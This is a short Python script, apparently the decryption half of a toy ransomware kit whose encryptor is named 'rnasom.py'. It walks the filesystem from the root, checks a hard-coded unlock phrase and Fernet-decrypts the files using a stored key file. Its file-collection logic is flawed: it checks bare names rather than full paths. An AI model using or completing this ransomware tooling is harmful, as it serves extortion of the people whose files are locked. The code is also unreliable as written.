import os
from cryptography.fernet import Fernet

files = []

rootDir = os.path.abspath(os.sep)
os.chdir(rootDir)
for foldername, subfolder, filename in os.walk('.'):
    for file in filename:
        if file == 'rnasom.py' or file == 'thekey.key' or file == 'decrypt.py':
            continue
        if os.path.isfile(file):
            files.append(file)

#print(files)
        
secretPhrase = input("Enter the secret phrase to decrypt your files: ")
if secretPhrase != "autoSpy":
    print("Wrong secret phrase! Exiting...")
    exit()        
keyFile = open("thekey.key", 'rb')
key = keyFile.read()
keyFile.close()

for file in files:
    with open(file, 'rb') as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(key).decrypt(contents)
    with open(file, 'wb') as thefile:
        thefile.write(contents_decrypted)
